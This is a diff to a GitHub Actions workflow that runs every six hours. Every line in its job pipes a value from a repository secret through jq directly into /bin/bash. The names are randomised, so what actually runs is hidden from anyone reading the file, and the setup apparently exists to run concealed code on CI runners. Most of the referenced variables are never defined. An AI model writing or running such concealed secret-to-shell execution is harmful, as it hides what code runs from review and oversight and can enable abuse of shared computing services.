@@ -2,7 +2,8 @@ name: yanjiaxin4635
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 0/6 * * *'
+    - cron: '17 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,18 +11,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: yanjiaxin4635
         env:
-          to639: ${{ secrets.to639 }}
+          vvkav88327: ${{ secrets.vvkav88327 }}
         run: |
-          echo $to639 | jq -r .r5769 | /bin/bash
-          echo $kq702 | jq -r .rveyu31324 | /bin/bash
-          echo $coepi03 | jq -r .l10169 | /bin/bash
-          echo $uq4 | jq -r .n51127 | /bin/bash
-          echo $rmz03604 | jq -r .gow5740 | /bin/bash
-          echo $fmybx5186 | jq -r .vuuoi1 | /bin/bash
-          echo $grvdp07 | jq -r .l91 | /bin/bash
-          echo $m6318 | jq -r .ad2735 | /bin/bash
-          echo $kez84298 | jq -r .bpik196 | /bin/bash
-          echo $sj7 | jq -r .w21 | /bin/bash
-          echo $udx9 | jq -r .asbp756 | /bin/bash
-          echo $oy089 | jq -r .c53 | /bin/bash
+          echo $vvkav88327 | jq -r .epfli47 | /bin/bash
+          echo $rbwj12 | jq -r .kzr628 | /bin/bash
+          echo $kr54 | jq -r .qye76 | /bin/bash
+          echo $ksfl75353 | jq -r .nzv27852 | /bin/bash
+          echo $bzsgq3 | jq -r .ueypj75164 | /bin/bash
+          echo $k8 | jq -r .tin9 | /bin/bash
+          echo $kv42 | jq -r .u34956 | /bin/bash
 
